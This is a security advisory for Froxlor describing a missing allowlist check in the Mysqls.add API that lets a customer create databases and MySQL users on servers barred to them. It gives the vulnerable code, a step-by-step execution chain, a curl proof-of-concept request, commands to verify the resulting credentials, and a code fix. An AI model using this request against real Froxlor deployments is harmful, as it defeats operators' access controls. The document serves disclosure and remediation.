# [M] Froxlor customer can create MySQL databases on disallowed servers via Mysqls.add API

## Summary
Severity: Medium
Advisory: GHSA-q4rm-m6xh-5pv7
CWE: CWE-285
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-q4rm-m6xh-5pv7
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.7

## Details
## Summary

The `Mysqls.add` API command (`lib/Froxlor/Api/Commands/Mysqls.php`) accepts a customer-controlled `mysql_server` parameter and only validates that the value is numeric and that the server index exists in `userdata.inc.php`. It never checks the value against the calling customer's `allowed_mysqlserver` allowlist. A customer can therefore create a database, plus a MySQL user with a password they choose, on any MySQL server the operator has configured — including servers that were explicitly excluded from that customer (e.g. a separate cluster, premium-tier host, or another tenant pool). The same `allowed_mysqlserver` check is correctly enforced in `MysqlServer::get()` / `MysqlServer::listing()` and in the customer-facing UI (`customer_mysql.php`), confirming the omission is a bug, not by-design.

## Details

**Vulnerable code path** — `lib/Froxlor/Api/Commands/Mysqls.php:69-99` (`add()`):

```php
public function add()
{
    if (($this->getUserDetail('mysqls_used') < $this->getUserDetail('mysqls') || ...) {
        ...
        $customer = $this->getCustomerData('mysqls');                       // line 80
        $dbserver = $this->getParam('mysql_server', true,                    // line 81 — user-controlled
            $this->getDefaultMySqlServer($customer));
        ...
        $dbserver = Validate::validate($dbserver, ..., '/^[0-9]+$/', ...);   // line 92 — numeric only
        Database::needRoot(true, $dbserver, false);                          // line 93 — root ctx for ANY index
        Database::needSqlData();
        $sql_root = Database::getSqlData();
        Database::needRoot(false);
        if (!is_array($sql_root)) {                                          // line 97 — only existence check
            throw new Exception("Database server with index #" . $dbserver . " is unknown", 404);
        }
        ...
        $username = $dbm->createDatabase($newdb_params['loginname'], $password,
            $dbserver, ...);                                                 // line 116/118 — DB+user created
        ...
        Database::pexecute($stmt, ["customerid"=>$customer['customerid'], ..., "dbserver"=>$dbserver], ...);
    }
}
```

The `$customer['allowed_mysqlserver']` field IS read on line 80 but is only consumed by `getDefaultMySqlServer()` (lines 566-573) to compute a default when the request omits `mysql_server`. As soon as the client supplies the parameter, the default path is skipped and no further authorization gate runs.

**Cross-file evidence the check is intended elsewhere:**

- `lib/Froxlor/Api/Commands/MysqlServer.php:319-323` — `get()` rejects with HTTP 405 when `$dbserver` is not in `allowed_mysqlserver`:
  ```php
  if ($this->isAdmin() == false) {
      $allowed_mysqls = json_decode($this->getUserDetail('allowed_mysqlserver'), true);
      if ($allowed_mysqls === false || empty($allowed_mysqls) || !in_array($dbserver, $allowed_mysqls)) {
          throw new Exception("You cannot access this resource", 405);
      }
      ...
  }
  ```
- `lib/Froxlor/Api/Commands/MysqlServer.php:252-257` — same allowlist filter on `listing()`.
- `customer_mysql.php:222` — UI rejects with `Response::dynamicError('No permission')` when `empty($allowed_mysqlservers)`.

**Chain of execution (attacker → impact):**

1. Customer authenticates to `api.php` with apikey/secret. The only API gate is `cust_api_allowed`; `allowed_mysqlserver` is not consulted at auth time.
2. Customer sends JSON `{"command":"Mysqls.add","params":{"mysql_password":"<valid>","mysql_server":<disallowed_idx>}}`.
3. `Mysqls.php:71` quota check passes (`mysqls_used < mysqls`).
4. `Mysqls.php:80` `getCustomerData('mysqls')` returns the caller's own row.
5. `Mysqls.php:81` `$dbserver` is set from the request (default-fallback path skipped).
6. `Mysqls.php:92` numeric regex passes.
7. `Mysqls.php:93-99` `Database::needRoot(true, $dbserver, false)` switches to the root context of the attacker-chosen server; existence check passes.
8. `Mysqls.php:116/118` `DbManager::createDatabase(...)` runs against the disallowed server using stored root credentials, creating the DB and granting the supplied password to `<loginname>_<sqlN>` (DbManager.php:177-218).
9. `Mysqls.php:127-141` inserts a row into `TABLE_PANEL_DATABASES` with the attacker's `customerid` and the disallowed `dbserver`, allowing later management via `Mysqls.get/update/delete` (which only filter by `customerid` for non-admins, e.g. `Mysqls.php:282`).

## PoC

Preconditions on the target instance:
- ≥2 MySQL servers configured in `lib/userdata.inc.php` (e.g. index 0 default, index 1 internal/premium).
- Customer X with `allowed_mysqlserver=[0]`, `cust_api_allowed=1`, `mysqls > 0`, and an issued API key (`apikey:secret`).

Request — customer creates a database on server `1`, which is *not* in their allowlist:

```bash
curl -k -u 'CUST_APIKEY:CUST_SECRET' \
  -H 'Content-Type: application/json' \
  -X POST \
  -d '{"command":"Mysqls.add","params":{"mysql_password":"ValidP@ssw0rd!","mysql_server":1}}' \
  https://froxlor.example.com/api.php
```

Expected (mirroring `MysqlServer.get()` behaviour): `HTTP 405 — "You cannot access this resource"`.
Actual: `HTTP 200` with the full database record, e.g.:

```json
{"data":{"id":42,"customerid":<cust_id>,"databasename":"<loginname>_sql1","dbserver":1,...}}
```

Verify the credentials work on the forbidden server:

```bash
mysql -h server1.host -u <loginname>_sql1 -p   # password: ValidP@ssw0rd!
mysql> SHOW DATABASES;        # the new DB is present
mysql> USE <loginname>_sql1;  # full access to the newly-created DB
```

The customer can subsequently manage the DB via `Mysqls.get`, `Mysqls.update`, and `Mysqls.delete` — those non-admin code paths filter only by `customerid` (`Mysqls.php:282-289`, `Mysqls.php:380-391`), which matches.

## Impact

- Bypass of the per-customer MySQL-server allowlist (`allowed_mysqlserver`) enforced by the admin/reseller. The authorization model is fully defeated for the `add` operation.
- The customer obtains valid MySQL credentials on a server the operator explicitly excluded for them — possibly an internal/separate cluster, billing tier, premium-only host, or a server provisioned for a different tenant pool.
- The customer can persist a DB on the forbidden server (resource and policy bypass), then read/write data there, and continue to manage it through `Mysqls.update` / `Mysqls.delete`.
- Impact is bounded: privileges granted by `DbManager::grantPrivilegesTo` apply only to the new `<loginname>_sqlN` database, so no cross-tenant data exposure on the forbidden server. The damage is policy bypass, resource consumption on the forbidden server, and credential persistence there.

## Recommended Fix

Mirror the allowlist check already present in `MysqlServer::get()`. After the numeric validation on `Mysqls.php:92`, before `Database::needRoot(...)`, add for non-admin callers:

```php
// validate whether the dbserver exists
$dbserver = Validate::validate($dbserver, html_entity_decode(lng('mysql.mysql_server')), '/^[0-9]+$/', '', 0, true);

// enforce per-customer allowed_mysqlserver allowlist (parity with MysqlServer::get())
if (!$this->isAdmin()) {
    $allowed = json_decode($customer['allowed_mysqlserver'] ?? '[]', true);
    if (!is_array($allowed) || empty($allowed)
        || !in_array((int)$dbserver, array_map('intval', $allowed), true)) {
        throw new Exception('You cannot access this resource', 405);
    }
}

Database::needRoot(true, $dbserver, false);
```

Audit `Mysqls::update()`, `Mysqls::delete()`, and `Mysqls::get()` for the same gap: those endpoints accept `mysql_server` and ultimately call `Database::needRoot(true, $result['dbserver'], false)` on the row's stored value. Once the row exists with a forbidden `dbserver`, those paths execute against the forbidden server unchallenged. Consider rejecting any non-admin operation whose target row's `dbserver` is outside `allowed_mysqlserver`, even if the row already exists, to defend in depth.

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-q4rm-m6xh-5pv7
- https://github.com/froxlor/froxlor
